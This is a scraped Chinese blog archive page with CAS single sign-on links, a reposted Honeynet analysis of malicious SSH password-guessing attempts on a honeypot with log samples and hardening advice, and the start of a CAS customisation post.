<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/02/09/343972.html" target="_blank">cas server 3.4.5 部署在weblogic问题记录</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01/26/343543.html" target="_blank">cas server使用mysql数据库和oralce数据库的差异</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343318.html" target="_blank">cas server logout的问题</a></li>
<li><a href="">cas配置全攻略</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/06/26/210852.html" target="_blank">JForum 的 SSO集成的问题解决</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/12/24/170126.html" target="_blank">apache2.2.6+tomcat5.5.17配置说明</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/12/04/85371.html" target="_blank">找不到C.TLD的问题</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/11/01/78479.html" target="_blank">roller2.3源代码部署笔录</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/07/31/60981.html" target="_blank">tomcat 服务器抛出socket异常“文件打开太多”的问题</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/12/26/25499.html" target="_blank">hsql的使用</a><br>Copyright ©2012 雪地孤鸿 Powered By: <a href="http://www.cnblogs.com/" target="_blank">博客园</a> 模板提供：<a href="http://blog.hjenglish.com/" target="_blank">沪江博客</a>
<a href="&quot;Go to the previous month&quot;">&lt;</a>2011年1月<a href="&quot;Go to the next month&quot;">&gt;</a>日一二三四五六2627282930311234567891011121314151617181920<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21.html" target="_blank">21</a>22232425<a href="http://www.blogjava.net/tufanshu/archive/2011/01/26.html" target="_blank">26</a>272829303112345</li>
</ul>
<h3 id="-">常用链接</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/MyPosts.html" target="_blank">我的随笔</a></li>
<li><a href="http://www.blogjava.net/tufanshu/MyComments.html" target="_blank">我的评论</a></li>
<li><a href="http://www.blogjava.net/tufanshu/OtherPosts.html" target="_blank">我的参与</a></li>
<li><a href="http://www.blogjava.net/tufanshu/RecentComments.html" target="_blank">最新评论</a></li>
</ul>
<h3 id="-13-">留言簿(13)</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/Contact.aspx?id=1" target="_blank">给我留言</a></li>
<li><a href="http://www.blogjava.net/tufanshu/default.aspx?opt=msg" target="_blank">查看公开留言</a></li>
<li><a href="http://www.blogjava.net/tufanshu/admin/MyMessages.aspx" target="_blank">查看私人留言</a></li>
</ul>
<h1 id="-">随笔分类</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/category/9675.html" target="_blank">appfuse(1)</a><a href="http://www.blogjava.net/tufanshu/category/9675.html/rss" title="Subscribe to appfuse(1)" target="_blank"><img src="&quot;Subscribe to appfuse(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/33305.html" target="_blank">CRM&amp;ERP(1)</a><a href="http://www.blogjava.net/tufanshu/category/33305.html/rss" title="Subscribe to CRM&amp;ERP(1)" target="_blank"><img src="&quot;Subscribe to CRM&amp;ERP(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/44350.html" target="_blank">Grails(3)</a><a href="http://www.blogjava.net/tufanshu/category/44350.html/rss" title="Subscribe to Grails(3)" target="_blank"><img src="&quot;Subscribe to Grails(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4974.html" target="_blank">java(11)</a><a href="http://www.blogjava.net/tufanshu/category/4974.html/rss" title="Subscribe to java(11)" target="_blank"><img src="&quot;Subscribe to java(11" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/41549.html" target="_blank">ofbiz学习(1)</a><a href="http://www.blogjava.net/tufanshu/category/41549.html/rss" title="Subscribe to ofbiz学习(1)" target="_blank"><img src="&quot;Subscribe to ofbiz学习(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/30111.html" target="_blank">seam2.0学习笔记(1)</a><a href="http://www.blogjava.net/tufanshu/category/30111.html/rss" title="Subscribe to seam2.0学习笔记(1)" target="_blank"><img src="&quot;Subscribe to seam2.0学习笔记(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4243.html" target="_blank">SPRING</a><a href="http://www.blogjava.net/tufanshu/category/4243.html/rss" title="Subscribe to SPRING" target="_blank"><img src="&quot;Subscribe to SPRING&quot;" alt=""></a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/30359.html" target="_blank">sso(3)</a><a href="http://www.blogjava.net/tufanshu/category/30359.html/rss" title="Subscribe to sso(3)" target="_blank"><img src="&quot;Subscribe to sso(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4244.html" target="_blank">STRUTS(1)</a><a href="http://www.blogjava.net/tufanshu/category/4244.html/rss" title="Subscribe to STRUTS(1)" target="_blank"><img src="&quot;Subscribe to STRUTS(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/3522.html" target="_blank">Sync4j(1)</a><a href="http://www.blogjava.net/tufanshu/category/3522.html/rss" title="Subscribe to Sync4j(1)" target="_blank"><img src="&quot;Subscribe to Sync4j(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/3293.html" target="_blank">SyncML(2)</a><a href="http://www.blogjava.net/tufanshu/category/3293.html/rss" title="Subscribe to SyncML(2)" target="_blank"><img src="&quot;Subscribe to SyncML(2" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/36144.html" target="_blank">大战SOA &amp; MULE</a><a href="http://www.blogjava.net/tufanshu/category/36144.html/rss" title="Subscribe to 大战SOA &amp; MULE" target="_blank"><img src="&quot;Subscribe to 大战SOA &amp; MULE&quot;" alt=""></a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/15210.html" target="_blank">工作日志(2)</a><a href="http://www.blogjava.net/tufanshu/category/15210.html/rss" title="Subscribe to 工作日志(2)" target="_blank"><img src="&quot;Subscribe to 工作日志(2" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4242.html" target="_blank">开发工具(3)</a><a href="http://www.blogjava.net/tufanshu/category/4242.html/rss" title="Subscribe to 开发工具(3)" target="_blank"><img src="&quot;Subscribe to 开发工具(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/22461.html" target="_blank">生活感悟(1)</a><a href="http://www.blogjava.net/tufanshu/category/22461.html/rss" title="Subscribe to 生活感悟(1)" target="_blank"><img src="&quot;Subscribe to 生活感悟(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/40597.html" target="_blank">系统维护(3)</a><a href="http://www.blogjava.net/tufanshu/category/40597.html/rss" title="Subscribe to 系统维护(3)" target="_blank"><img src="&quot;Subscribe to 系统维护(3" alt="">&quot;)</a></li>
</ul>
<h1 id="-">随笔档案</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/02.html" target="_blank">2011年2月 (2)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01.html" target="_blank">2011年1月 (3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/12.html" target="_blank">2010年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/05.html" target="_blank">2010年5月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/03.html" target="_blank">2010年3月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/12.html" target="_blank">2009年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/09.html" target="_blank">2009年9月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/08.html" target="_blank">2009年8月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/07.html" target="_blank">2009年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/05.html" target="_blank">2009年5月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/04.html" target="_blank">2009年4月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/02.html" target="_blank">2009年2月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/07.html" target="_blank">2008年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/06.html" target="_blank">2008年6月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/03.html" target="_blank">2008年3月 (3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/12.html" target="_blank">2007年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/08.html" target="_blank">2007年8月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/07.html" target="_blank">2007年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/12.html" target="_blank">2006年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/11.html" target="_blank">2006年11月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10.html" target="_blank">2006年10月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/09.html" target="_blank">2006年9月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/07.html" target="_blank">2006年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/04.html" target="_blank">2006年4月 (2)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/12.html" target="_blank">2005年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/11.html" target="_blank">2005年11月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/10.html" target="_blank">2005年10月 (4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/09.html" target="_blank">2005年9月 (1)</a></li>
</ul>
<h1 id="-">文章档案</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archives/2005/09.html" target="_blank">2005年9月 (1)</a></li>
</ul>
<h1 id="blog">blog</h1>
<ul>
<li><a href="http://www.blogjava.net/eamoi/" target="_blank">eamoi之Coder日志</a></li>
<li>ajax</li>
<li><a href="http://www.blogjava.net/eamoi" target="_blank">liferayPortal</a></li>
<li><a href="http://steeven.cnblogs.com/" target="_blank">steeven</a></li>
<li><a href="http://www.cnblogs.com/zhengyun_ustc/" target="_blank">sync4j</a></li>
<li><a href="http://www.u2o.net/blog/default.asp" target="_blank">sync4j1</a></li>
<li><a href="http://www.blogjava.net/sean" target="_blank">大胃</a></li>
<li><a href="http://www.blogjava.net/zyb9114/" target="_blank">月亮的太阳</a></li>
<li><a href="http://www.blogjava.net/SteelHand" target="_blank">铁手剑谱</a></li>
<li>铁手</li>
</ul>
<h3 id="-">搜索</h3>
<p>*</p>
<ul>
<li></li>
</ul>
<h3 id="-http-www-blogjava-net-tufanshu-commentsrss-aspx-">最新评论 <a href="http://www.blogjava.net/tufanshu/CommentsRSS.aspx" target="_blank"><img src="" alt=""></a></h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/11/02/343972.html#362546" target="_blank">1. re: cas server 3.4.5 部署在weblogic问题记录[未登录]</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--大雄</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/10/19/343290.html#361580" target="_blank">2. re: cas配置全攻略</a></li>
<li>同样遇到 Map是空的，没有附加属性</li>
<li>--fanfree</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/06/19/343318.html#352630" target="_blank">3. re: cas server logout的问题</a></li>
<li>加了这个还是停在原来的退出页面，</li>
<li>--artd</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/06/05/343290.html#351783" target="_blank">4. re: cas配置全攻略</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--artd</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/03/29/343290.html#347172" target="_blank">5. re: cas配置全攻略</a></li>
<li>通过ldap验证，改怎样修改呢</li>
<li>--wuximin</li>
</ul>
<h3 id="-">阅读排行榜</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10/20/76389.html" target="_blank">1. linux+php5.1.6+mysql5.0.2+apache2.0.55安装配置说明：(12245)</a></li>
<li><a href="">2. cas配置全攻略(3704)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/09/14/69691.html" target="_blank">3. 在tomcat下发布使用eclipse中的ant打包后的war文件(3490)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/03/25/188552.html" target="_blank">4. cas配置之初体验(3313)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/07/26/217681.html" target="_blank">5. opencrx安装手记(2914)</a></li>
</ul>
<h3 id="-">评论排行榜</h3>
<ul>
<li><a href="">1. cas配置全攻略(7)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10/20/76389.html" target="_blank">2. linux+php5.1.6+mysql5.0.2+apache2.0.55安装配置说明：(4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/10/15/15574.html" target="_blank">3. SyncML Intensive 继续(4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/11/17/20309.html" target="_blank">4. jdk1.4升级到JDK1.5的问题(3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/09/03/293787.html" target="_blank">5. ofbiz9 + oracle 11g(3)</a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--黑客经典之恶意SSH登录企图分析/">黑客经典之恶意SSH登录企图分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全--黑客经典之恶意SSH登录企图分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-ssh-">黑客经典之恶意SSH登录企图分析</h1>
<p>黑客经典之恶意SSH登录企图分析</p>
<p>原文链接：<a href="http://www.securitycn.net/html/research/service/1395.html" target="_blank">http://www.securitycn.net/html/research/service/1395.html</a></p>
<p>恶意SSH登录企图出现在一些管理者的日志中已经有几年的时间了。本文回顾了使用&quot;蜜罐&quot;（honeypot）对恶意SSH登录企图进行分析的方法，并提出了我们可以从这一活动中学到的东西。接着本文给出了关于如何使自己的系统安全面对这些攻击的建议。</p>
<p>使用honeypots进行研究</p>
<p>新西兰Honeynet（蜜罐网络）联盟是Honeynet联盟的一个成员研究机构，它致力于通过使用蜜罐技术研究黑帽子黑客（black hat hackers，指那些恶意入侵计算机或计算机网络并尽其所能进行破坏的黑客）的行为、策略和工具来提升计算机系统和网络安全。蜜罐的价值在于它们是可以公开接受攻击并被攻入的开放计算机系统，这使得研究者可以分析该系统上的恶意行为。</p>
<p>我们已经在惠灵顿的维多利亚大学建立起这样的系统来研究发生于新西兰大学网络上的恶意行为。该系统是一个高度互联的蜜罐，一个攻击者可以像在网络的任何其他系统上一样与之联系。在攻击者可知的范围内，蜜罐与其他计算机系统应该没有可分辨的差别。然而，所有流入和流出蜜罐的网络流量都通过Honeynet联盟的Roo honeywall严密监控。此外，系统事件也被蜜罐自身通过其日志功能进行记录。</p>
<p>蜜罐上运行的是标准RedHad 9服务器配置版本，带有可以通过公共互联网访问的安全外壳（Secure Shell，简称SSH）服务器。SSH是可以使得一个用户在网上通过加密通道登录到另一台电脑的程序。在过去的配置下遭遇到恶意SSH登录企图后，我们重新编配了我们的蜜罐以使其可以收集更多的数据。我们对SSH服务器打了补丁以同时记录在登录企图中使用的帐户名和密码。该蜜罐在2006年7月11日上线，在22天后的2006年8月1日下线。在这期间，该蜜罐受到了无数次的SSH登录企图攻击。我们进一步观察这些数据以确定攻击者的策略并提出提高 SSH安全水平的建议。
。</p>
<p>在该蜜罐在6月28日到7月4日运行的另一个配置上，我们增加了可以在系统被攻入后记录攻击者键盘操作的Sebek模块。我们设置了若干具有常用密码的用户帐户。几天后，一个攻击者成功进入了这一系统。在本文中给出了对这一攻击及后续攻击的分析，并提供了对恶意SSH登录企图如何被用于攻入系统的进一步分析。</p>
<p>对SSH登录企图的分析</p>
<p>这一部分分析了7月11日到8月1日我们的蜜罐捕获的数据。该分析完全基于蜜罐的系统日志文件，尤其是&quot;messages&quot;日志。&quot;messages&quot;日志记录了对SSH服务器的验证请求。它记录了日期、时间、登录企图发生的IP地址、请求的结果（失败或成功）以及验证使用的帐户名和密码。下面是两个&quot;messages&quot;的日志示例条目：</p>
<p><code> 
Jul 13 09:37:59 basta sshd[22308]: PW-ATTEMPT: fritz<br>Jul 13 09:37:59 basta sshd[22308]: Failed password for  root from 10.0.160.14<br> port 39529 ssh2<br>Jul 13 09:38:02 basta sshd[22310]: Illegal user   fatacunike from 10.0.160.14<br>Jul 13 09:38:02 basta sshd[22310]: PW-ATTEMPT: fatacunike<br>Jul 13 09:38:02 basta sshd[22310]: Failed password for illegal user fatacunike<br> from 10.0.160.14 port 40444 ssh2
</code></p>
<p>首先，我们分析了用于登录企图的用户名。在取样时间内，系统日志总共记录到2741 个不同的帐户名，包括从常见的姓氏、系统帐户名和常用帐户名到短的字符串。在这些帐户名中，15个使用频率最高的帐户名被列于表1。该表格显示有一个系统上通常存在的帐户（root，mysql）、可能存在的帐户（guest、test）以及常见的姓氏（paul）。随后图1给出了所使用过的有效与无效帐户名的分布。</p>
<p>所使用的无效帐户名远多于有效帐户名并不奇怪，但是我们注意到在蜜罐上存在的所有默认帐户名中96.30%都被攻击利用。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20060915/1052550.jpg" alt=""></p>
<p>表1 2741次攻击中出现最多的15个帐户名</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20060915/1052551.jpg" alt=""></p>
<p>（Number of Account Names Used in Attack：攻击中使用的帐户名数量；</p>
<p>Number of Account Names on System：系统中的帐户名数量</p>
<p>Existing Account：有效帐户</p>
<p>Invalid Account：无效帐户）</p>
<center>图1 有效与无效帐户名数量</center>  

<p>&quot;成功&quot;的恶意SSH登录企图</p>
<p>在上面的部分中，我们分析了对于没有成功的恶意SSH登录企图数据的记录。这些数据可以使我们进一步理解这些攻击者如何操作，但是还有很多问题没有解决，其中之一是这些攻击中是否使用了工具软件。</p>
<p>7月2日，有一名攻击者通过猜测出一个SSH上的有效帐户名/密码成功地侵入了蜜罐。在这一事件中捕获的数据揭示了这些问题的答案。</p>
<p>首先我们观察了该黑客成功入侵蜜罐后进行的操作。确定了有效的帐户名/密码后，该黑客通过SSH登入蜜罐并继而下载了一个SSH扫描工具。在下面一节将更详细地介绍该工具，这里我们先将其总结为一个可以允许其使用者通过猜测密码的尝试识别并入侵其它SSH服务器的工具。这一工具安装后立刻被用来从我们的蜜罐中扫描B类网络。由于Roo honeywall对于向网络外部的连接施加的限制，该SSH扫描工具并未发现任何SSH服务器。</p>
<p>在最初的扫描后，攻击者继续下载并安装一个IRC僵尸（IRC Bot）。IRC僵尸是可以在远程通过IRC聊天通道控制一个被入侵的系统的工具，其中被入侵的系统被设定为可以通过该通道被监听。使用IRC来控制一个被入侵的系统比直接使用SSH要隐蔽得多，因为此时攻击者不再需要直接登入系统。此外，它还使得攻击者可以同时控制多个这样的系统（它们被称为 Zombies，还魂尸)。</p>
<p>IRC通道中的会话表明，Zombies被用于使用类似于被下载到我们的蜜罐上那样的SSH扫描工具扫描B类网络。在几个小时的时间里，有4个B类网络被来自不同IRC僵尸的SSH扫描工具扫描。一次扫描大约需要700秒的时间完成。此外，我们还目睹了一个帐户名/密码列表与160,324个不同的帐户名/密码组合之间的信息交换。这些帐户名与密码的结构与对我们的蜜罐系统进行攻击时使用的那些非常相似，但比它们范围更广。</p>
<p>分析总结</p>
<p>从这些被我们的蜜罐记录的数据中我们可以得到什么？SSH是一种可以通过安全、加密的方式在网络中访问一台电脑的方法，已经被广泛接受。然而，尽管其在安全方面名誉很好，在一台电脑上操作SSH仍然会面临威胁。如我们在本文中所示的那样，密码猜测显然是威胁之一。仅SSH服务器正在运行并可经互联网连接这一事实就吸引了23次来自独立IP的攻击，在22天内我们的蜜罐共受到6,899 次登录企图。这相当于大约平均每天1次攻击、约300次登录尝试。一些攻击者的攻击非常执着，在每次攻击中执行了上百次登录尝试。</p>
<p>扫描工具的数据记录显示有非常强有力的工具被使用。它们十分灵活并且可以使用用户定制的帐户名/密码列表进行攻击。如果一个攻击者想攻击一个特定的域，他们或许可以通过社会工程获取帐户名，然而将这些帐户名于将在攻击中使用的标准密码组合。通过观察一个IRC僵尸通道，我们发现攻击者们将扫描工具与IRC僵尸计数结合来通过Zombies（攻击者通过远程通道控制的被入侵的系统）进行扫描。</p>
<p>与一系列IRC僵尸结合后，一个攻击者只需要525个Zombies就可以在1天内扫描当今公共互联网的整个IP4。如果你有一个可以被公开访问的SSH服务器，你很可能就会成为这些攻击的目标。</p>
<p>安全建议</p>
<p>有很多简单的方法可以防范这些攻击。最显而易见的方式就是关闭在很多系统中被默认安装的daemon服务。如果一个计算机系统被作为桌面电脑，很可能没有必要用通过SSH的远程访问登入该电脑。如果该方式对你不适用，还有很多其他的选择：</p>
<p>·使用大多数Unix和Linux系统中的/etc/hosts.allow和/etc/hosts.deny文件限制对特定主机的daemon访问。</p>
<p>·安装一个防火墙以限制只允许指定的电脑与网络访问SSH服务器。这在来自内部网络一台电脑的管理员必须对该电脑远程操作时尤其适用。</p>
<p>·限制SSH服务器只允许经过验证的特定用户和组登录。</p>
<p>·将SSH服务器监听端口从22调整到其他未被使用的端口。尽管这样做不会阻止攻击者连接到服务器并开始猜测密码，但它会显著降低发现你的SSH daemon的可能性，因为黑客使用的是标准SSH客户端而且假定SSH服务器的攻击工具是运行于标准的22端口上的。</p>
<p>·除了简单的密码外使用其他验证方法。下面有关于这点的更多介绍。如果你无法选择这一方法，确保正在使用的密码或验证短语安全程度高而且是比较复杂的。</p>
<p>SSH提供了另一种可以成功地减少密码猜测攻击的验证方法。这一验证方法是基于密钥的，或者说是所谓的私钥与公钥。公钥被置于服务器端作为访问你的帐户的用户锁。该锁只能被对应的私钥开启。一旦你提供了该私钥，你就可以获得访问权限。由于攻击者无法猜测或生成这一私钥，密码猜测攻击将失败。所有流行的SSH服务器默认状态下都被设置为支持这一验证方法。然而，它们通常在提供的私钥错误时重新回到基于密码的验证过程，这再次为密码猜测攻击提供了方便。为使这一降低风险的策略成功，这些服务器需要被重新设定为只接受基于密钥的验证。</p>
<p>建立使用密钥的SSH十分简单，只需要几分钟的时间。先前Brian Hatch的文章已经谈及了关于个人用户和SSH服务器间安全访问的SSH用户身份。SSH主机密钥保护一文中提供了关于每台服务器所生成的主机密钥的更多信息。如果使用SSH密钥，读者可能希望获得更多SSH于ssh-agent的例子以便更快更容易地通过SSH登录。</p>
<p>在一些例子中，对一个SSH服务器基于密码的验证或访问无法被禁用。在这种情况下，需要采用其他措施。我们已经看到攻击者猜测帐户名并且对现有系统的帐户以及在通常的计算机系统中的帐户了如指掌。如果该攻击者可以猜到系统中存在的一个帐户名——对于我们的蜜罐，在Redhat蜜罐系统中96.30%的默认帐户名被猜到——则该攻击者已经在该电脑的门口踏入了一步。因此，我们建议不要使用很容易被猜到的帐户名，例如那些常见的姓氏。不要使用&quot;Peter&quot;、&quot;Ian&quot;、或&quot;Mark&quot;，而是建立包括有姓和名的组合的帐户名，例如 &quot;seifer_chr&quot;。这可以通过控制帐户名分配的管理员做到。</p>
<p>此外，我们已经看到&quot;root&quot;帐户是在攻击中使用最多的帐户名，因为它通常都存在于计算机系统中。我们建议禁用该帐户的远程访问权限，取而代之的是管理员应该先通过一般用户帐户再使用&quot;su&quot;（超级用户指令）获得该root帐户的权限。</p>
<p>攻击者经常试图猜测在大多数系统上默认存在的长湖，例如ftp和mysql。如果 shell外壳与这些帐户关联，那么只有通过这些帐户才能访问外壳。对于ftp或mysql这样其存在只为运行电脑上某服务的帐户，外壳是不需要的并且应该被禁用，这可以有效地阻止通过SSH使用这些帐户远程登录。</p>
<p>除了使用无法被猜到的帐户名外，使用安全性强的用户密码也是很重要的。我们已经看到在攻击中使用的密码通常与帐户名相同或者是帐户名加上一些数列。我们推测攻击者们选择这些密码因为它们在恶意登录企图中是最&quot;成功&quot;的。这表明至少有些用户将他们的密码设置为这些很容易被猜到的字符串。系统管理员阻止用户选用这样的密码的唯一方法是通过安装各种工具软件（例如passwd+）强制用户使用安全性高的密码。</p>
<p>攻击者们正在使用工具进行密码猜测和登录尝试，例如被记录的扫描工具、QT和 55hb。然而，尽管有这些工具存在，由于SSH服务器端内置的对于失败登录企图的故意延迟以及各种网络延迟，登录尝试的最短平均时间也需要约2秒。尽管这提供了对于暴力攻击的防范，对于安全性差的帐户名和密码只需要少数几次尝试与猜测就可以侵入系统。以上所描述的安全措施应该被安装以保证安全工作的广泛与深入。</p>
<p>未来的工作</p>
<p>我们的分析是基于我们的蜜罐捕获的数据进行的。我们无法确定这些攻击对于网络上可以找到的系统成功的概率有多大。为了确定成功率，我们需要将这些攻击中使用的帐户名/密码组合与在真实系统中存在的帐户名/密码组合进行比较。此外，我们提出了将SSH服务器监听端口改到其他未占用的端口。我们需要建立这样配置的系统以评估其有效性。</p>
<p>关于作者</p>
<p>Christian Seifert是新西兰Honeynet联盟的成员。</p>
<p>致谢</p>
<p>感谢Jamie Riden提供降低密码猜测风险的策略以及对实际SSH密码猜测工具的参考。</p>
<p>本篇文章来源于 中国安全网-安全您的网络 原文链接：<a href="http://www.securitycn.net/html/research/service/1395.html" target="_blank">http://www.securitycn.net/html/research/service/1395.html</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 21:31:05"datetime="2014-03-29 21:31:05"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--黑客经典之恶意SSH登录企图分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--黑客经典之恶意SSH登录企图分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/">cas改造随笔 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--cas改造随笔-horus-博客园/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="cas-horus-">cas改造随笔 - horus - 博客园</h1>
<p><a href=""></a></p>
<p><a href="http://www.cnblogs.com/hellowood/" target="_blank">hello wood</a>
<a href="http://www.cnblogs.com/" target="_blank">博客园</a>   <a href="http://www.cnblogs.com/hellowood/" target="_blank">首页</a>   <a href="http://space.cnblogs.com/" target="_blank">社区</a>   <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx?opt=1" target="_blank">新随笔</a>   <a href="http://space.cnblogs.com/msg/send/horus" target="_blank">联系</a>   <a href="http://www.cnblogs.com/hellowood/rss" target="_blank">订阅</a><a href="http://www.cnblogs.com/hellowood/rss" target="_blank"><img src="" alt="订阅"></a>   <a href="http://www.cnblogs.com/hellowood/admin/EditPosts.aspx" target="_blank">管理</a></p>
<p>随笔-9  评论-5  文章-1  trackbacks-0</p>
<h1 id="-cas-http-www-cnblogs-com-hellowood-archive-2010-08-05-1793364-html-"><a href="http://www.cnblogs.com/hellowood/archive/2010/08/05/1793364.html" target="_blank">cas改造随笔</a></h1>
<p>Sso doc</p>
<p>关键字：</p>
<p>sso域名：cas.server.com</p>
<p>登陆地址（spring web flow）：<a href="https://cas.800jit.com/cas/login" target="_blank"><a href="https://cas.800jit.com/cas/login">https://cas.800jit.com/cas/login</a></a></p>
<p>登陆地址（直接）：<a href="https://cas.800jit.com/cas/directLogin" target="_blank"><a href="https://cas.800jit.com/cas/directLogin">https://cas.800jit.com/cas/directLogin</a></a></p>
<p>退出地址：<a href="https://cas.800jit.com/cas/logout" target="_blank"><a href="https://cas.800jit.com/cas/logout">https://cas.800jit.com/cas/logout</a></a></p>
<p>语言参数：locale=zh_CN，locale=en</p>
<h1 id="-">环境篇</h1>
<p> <img src="" alt=""></p>
<h2 id="-">一、所需软件</h2>
<p>Jdk：jdk1.6.0_13</p>
<p>Apache：httpd-2.2.15-win32-x86-openssl-0.9.8m-r2</p>
<p>Tomcat：apache-tomcat-6.0.10</p>
